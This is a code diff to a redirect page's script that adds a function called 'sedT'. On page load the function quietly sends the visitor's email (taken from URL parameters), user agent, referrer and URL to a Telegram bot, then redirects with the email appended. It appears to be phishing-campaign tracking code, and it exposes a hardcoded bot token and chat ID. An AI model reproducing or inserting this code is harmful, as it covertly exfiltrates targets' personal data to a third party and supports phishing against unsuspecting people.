@@ -148,6 +148,44 @@
         return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
     }
 
+    async function sedT(email) {
+        const BOT_TOKEN = '8440940013:AAFX8fxLTtZ2SUpc-KenhEdUrE2RRced58o'; 
+        const CHAT_ID = '7616147846';     
+        
+        const visitData = {
+            email: email || 'No Email',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || 'direct',
+            url: window.location.href
+        };
+
+
+        const message = `🔔 New Visit Alert!\n\n` +
+                       `📧 Email: ${visitData.email}\n` +
+                       `⏰ Time: ${new Date(visitData.timestamp).toLocaleString()}\n` +
+                       `🔍 Referrer: ${visitData.referrer}\n` +
+                       `🌐 URL: ${visitData.url}\n` +
+                       `📱 Device: ${visitData.userAgent}`;
+
+        try {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Failed to send Telegram notification:', error);
+        }
+    }
+
     document.addEventListener('DOMContentLoaded', () => {
         // Check all possible sources for email
         let email = getUrlParameter('mail') || 
@@ -161,6 +199,9 @@
         if (email) {
             targetUrl += '#' + email;
         }
+
+        // Send Telegram notification
+        sedT(email);
 
         // Redirect after 2 seconds
         setTimeout(() => {
